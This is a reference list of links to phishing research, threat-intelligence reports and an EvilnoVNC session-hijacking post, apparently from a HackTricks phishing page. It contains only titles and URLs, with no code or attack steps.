- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)
- [Impersonation, Click Hijacking, and TDS: Inside a Malware Distribution Ecosystem](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)

{{#include ../../banners/hacktricks-training.md}}
